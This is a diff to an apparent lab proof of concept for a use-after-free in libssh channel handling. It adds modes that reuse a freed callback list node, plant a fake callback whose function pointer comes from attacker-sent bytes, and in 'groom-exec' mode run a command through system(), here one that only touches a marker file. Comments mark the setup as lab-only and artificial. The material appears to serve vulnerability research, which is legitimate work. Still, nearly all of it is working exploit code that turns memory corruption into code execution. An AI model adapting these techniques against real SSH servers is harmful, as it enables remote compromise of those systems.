@@ -17,6 +17,7 @@
 #include <libssh/channels.h>
 #include <libssh/ssh2.h>
 #include <libssh/packet.h>
+#include <libssh/misc.h>
 
 #define PORT 42229
 static volatile int g_done = 0;
@@ -29,6 +30,13 @@ static void *g_saved_buf = NULL;
 static void *g_saved_cbs = NULL;
 static volatile uint64_t g_target = 0x4141414141414141ull;
 static void *g_groom_ptr = NULL;
+static int g_call = 0;
+static int g_bad_call = 0;
+static int g_marker_hits = 0;
+static void *g_saved_it = NULL;
+static int g_exec = 0;
+static int g_exec_rc = -1;
+static const char g_exec_cmd[] = "touch evidence-wire-vuln-groom-exec.marker";
 
 static int auth_password(ssh_session s, const char *user, const char *pass, void *u)
 {
@@ -65,15 +73,17 @@ static int on_data(ssh_session s, ssh_channel ch, void *data, uint32_t len,
             memcpy(wire, data, sizeof(wire));
         }
         if (g_survive) {
-            /* Lab-only: detach the stdout ssh_buffer before the channel free
-             * so channel_rcv_data() can reach its later uses after the
-             * chosen-pointer write. This is NOT a realistic app pattern. */
+            /* Lab-only: detach the stdout ssh_buffer and the callback list
+             * before the channel free so channel_rcv_data() can reach its
+             * later uses after the chosen-pointer write. This is NOT a
+             * realistic app pattern. */
             g_saved_buf = ch->stdout_buffer;
             ch->stdout_buffer = NULL;
             g_saved_cbs = ch->callbacks;
+            g_saved_it = ssh_list_get_iterator(ch->callbacks);
             ch->callbacks = NULL;
-            printf("SERVER groom-survive saved_buf=%p saved_cbs=%p\n",
-                   g_saved_buf, g_saved_cbs);
+            printf("SERVER groom-survive saved_buf=%p saved_cbs=%p first=%p\n",
+                   g_saved_buf, g_saved_cbs, g_saved_it);
             fflush(stdout);
         }
         ssh_channel_free(ch);
@@ -99,6 +109,33 @@ static int on_data(ssh_session s, ssh_channel ch, void *data, uint32_t len,
                 fflush(stdout);
             }
         }
+        if (g_call && len >= 128) {
+            /* Lab-only W4: the first list node was kept alive by the detach
+             * above. Redirect its next pointer to an app-owned fake callback
+             * entry whose function pointer is chosen by wire bytes, so the
+             * post-callback ssh_callbacks_iterate executes a chosen address. */
+            struct ssh_iterator *first = (struct ssh_iterator *)g_saved_it;
+            struct ssh_channel_callbacks_struct *fake;
+            struct ssh_iterator *fake_it;
+            uint64_t fn = 0;
+            memcpy(&fn, wire + 112, sizeof(fn));
+            fake = malloc(sizeof(*fake));
+            fake_it = malloc(sizeof(*fake_it));
+            if (first != NULL && fake != NULL && fake_it != NULL) {
+                memset(fake, 0, sizeof(*fake));
+                fake->size = sizeof(*fake);
+                fake->userdata = g_exec ? g_groom_ptr : NULL;
+                fake->channel_data_function =
+                    (ssh_channel_data_callback)(uintptr_t)fn;
+                fake_it->next = NULL;
+                fake_it->data = fake;
+                first->next = fake_it;
+                printf("SERVER call fake_cbs=%p node=%p fn=0x%llx first=%p\n",
+                       (void *)fake, (void *)fake_it,
+                       (unsigned long long)fn, (void *)first);
+                fflush(stdout);
+            }
+        }
         g_done = 1;
     }
     return (int)len;
@@ -110,6 +147,30 @@ static void on_close(ssh_session s, ssh_channel ch, void *u)
     printf("SERVER close callback\n");
     fflush(stdout);
 }
+static int marker_data(ssh_session s, ssh_channel ch, void *data, uint32_t len,
+                       int stderr, void *u)
+{
+    (void)s; (void)ch; (void)data; (void)stderr; (void)u;
+    g_marker_hits++;
+    printf("SERVER MARKER called len=%u hits=%d\n", len, g_marker_hits);
+    fflush(stdout);
+    return 0;
+}
+static int exec_trampoline(ssh_session s, ssh_channel ch, void *data,
+                           uint32_t len, int stderr, void *u)
+{
+    const char *cmd = (const char *)u;
+    (void)s; (void)ch; (void)data; (void)len; (void)stderr;
+    printf("SERVER EXEC trampoline cmd=%s\n", cmd != NULL ? cmd : "(null)");
+    fflush(stdout);
+    if (cmd == NULL) return 0;
+    g_exec_rc = system(cmd);
+    printf("SERVER EXEC rc=%d\n", g_exec_rc);
+    fflush(stdout);
+    return 0;
+}
+
+
 
 static int run_server(const char *keyfile)
 {
@@ -168,7 +229,9 @@ static int run_server(const char *keyfile)
         }
         ssh_event_dopoll(event, 100);
     }
-    printf("SERVER done data_packets=%d\n", g_data_packets);
+    printf("SERVER done data_packets=%d marker_hits=%d\n",
+           g_data_packets, g_marker_hits);
+    printf("SERVER exec rc=%d\n", g_exec_rc);
     printf("SERVER target_after=0x%llx groom_ptr=%p\n",
            (unsigned long long)g_target, g_groom_ptr);
     if (g_survive) {
@@ -252,6 +315,21 @@ static int run_client(void)
         memcpy(payload, marker, strlen(marker));
         payload[16] = '-';
         memcpy(payload + 120, &want, sizeof(want));
+        if (g_call) {
+            uint64_t fn = g_bad_call ? 0x4141414141414141ull :
+                          (g_exec ? (uint64_t)(uintptr_t)&exec_trampoline :
+                           (uint64_t)(uintptr_t)&marker_data);
+            memcpy(payload + 112, &fn, sizeof(fn));
+            if (g_exec) {
+                memcpy(payload, g_exec_cmd, sizeof(g_exec_cmd));
+                printf("CLIENT sent exec cmd=%s fn=0x%llx\n",
+                       g_exec_cmd, (unsigned long long)fn);
+            } else {
+                printf("CLIENT sent call fn=0x%llx bad=%d\n",
+                       (unsigned long long)fn, g_bad_call);
+            }
+            fflush(stdout);
+        }
         if (g_survive) {
             memset(payload + 56, 0, 8);  /* stdout_buffer */
             memset(payload + 64, 0, 8);  /* stderr_buffer */
@@ -289,7 +367,8 @@ int main(int argc, char **argv)
     ssh_init();
     pid_t pid;
     if (argc < 2 || argc > 3) {
-        fprintf(stderr, "usage: %s hostkey [data-only|no-free|groom|groom-survive]\n",
+        fprintf(stderr,
+                "usage: %s hostkey [data-only|no-free|groom|groom-survive|groom-call|groom-call-bad|groom-exec]\n",
                 argv[0]);
         return 2;
     }
@@ -303,6 +382,20 @@ int main(int argc, char **argv)
     } else if (argc == 3 && strcmp(argv[2], "groom-survive") == 0) {
         g_groom = 1;
         g_survive = 1;
+    } else if (argc == 3 && strcmp(argv[2], "groom-call") == 0) {
+        g_groom = 1;
+        g_survive = 1;
+        g_call = 1;
+    } else if (argc == 3 && strcmp(argv[2], "groom-call-bad") == 0) {
+        g_groom = 1;
+        g_survive = 1;
+        g_call = 1;
+        g_bad_call = 1;
+    } else if (argc == 3 && strcmp(argv[2], "groom-exec") == 0) {
+        g_groom = 1;
+        g_survive = 1;
+        g_call = 1;
+        g_exec = 1;
     } else if (argc == 3) {
         fprintf(stderr, "unknown mode: %s\n", argv[2]);
         return 2;
